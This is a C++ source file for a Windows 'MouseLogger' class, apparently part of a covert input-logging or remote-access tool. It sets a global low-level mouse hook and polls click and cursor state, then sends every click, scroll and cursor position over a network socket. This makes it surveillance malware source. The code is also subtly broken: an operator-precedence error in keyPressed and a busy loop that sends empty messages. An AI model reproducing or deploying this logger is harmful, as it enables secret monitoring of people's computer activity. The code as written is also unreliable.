#include "MouseLogger.h"

SOCKET _mouseSock;
HHOOK _globalMouseHook = NULL;

MouseLogger::MouseLogger() {}

MouseLogger::~MouseLogger() {}

// helper function - returns if a specific key has been pressed
int MouseLogger::keyPressed(int key) {
	return (GetAsyncKeyState(key) & 0x8000 != 0);
}

// function listens to all mouse clicks & position changes. Will be used as a thread
void MouseLogger::recordMouseClicks(SOCKET sock)
{
	while (true)
	{
		std::string msg = "";

		if (MouseLogger::keyPressed(VK_LBUTTON))
		{
			msg = "<left-click>";
		}
		else if (MouseLogger::keyPressed(VK_RBUTTON))
		{
			msg = "<right-click>";
		}
		else if (MouseLogger::keyPressed(VK_MBUTTON))
		{
			msg = "<scroll-click>";
		}

		std::cout << msg;
		send(sock, msg.c_str(), msg.length(), 0);
	}
}

// callback function to get scroll wheel actions - up/down
LRESULT CALLBACK MouseLogger::startListen(int nCode, WPARAM wParam, LPARAM lParam)
{
	std::string scroll_event = "";

	if (nCode == HC_ACTION)
	{
		MSLLHOOKSTRUCT* pMouseStruct = (MSLLHOOKSTRUCT*)lParam;

		if (wParam == WM_MOUSEWHEEL)
		{
			// Extract the scroll delta from the wParam
			short delta = GET_WHEEL_DELTA_WPARAM(pMouseStruct->mouseData);

			// finding if the scroll is up/down:
			if (delta > 0)
				scroll_event = "<scroll-up>";
			else
				scroll_event = "<scroll-down>";
		}
	}

	std::cout << scroll_event;
	send(_mouseSock, scroll_event.c_str(), scroll_event.length(), 0);
	return CallNextHookEx(_globalMouseHook, nCode, wParam, lParam);
}

// function will be used as a thread
// calls the callback function
void MouseLogger::recordScrollBar(SOCKET sock)
{
	_mouseSock = sock;

	_globalMouseHook = SetWindowsHookEx(WH_MOUSE_LL, MouseLogger::startListen, 0, 0);
	MSG msg;
	while (GetMessage(&msg, NULL, 0, 0)) {
		TranslateMessage(&msg);
		DispatchMessage(&msg);
	}
	UnhookWindowsHookEx(_globalMouseHook);
}


// helper function - returns if 2 POINTS are equal
bool MouseLogger::comparePoints(POINT a, POINT b) { return (a.x == b.x && a.y == b.y); }

void MouseLogger::recordMousePos(SOCKET sock)
{
	POINT currPos;
	POINT tempPos;

	GetCursorPos(&currPos);
	while (true)
	{
		std::string msg = "";

		// if noticing a cursor placement change:
		GetCursorPos(&tempPos);
		if (!MouseLogger::comparePoints(currPos, tempPos))
		{
			currPos = tempPos;

			msg = "<" + std::to_string(currPos.x) + "x" + std::to_string(currPos.y) + ">";

			std::cout << msg;
			send(sock, msg.c_str(), msg.length(), 0);
			Sleep(10);
		}
	}
}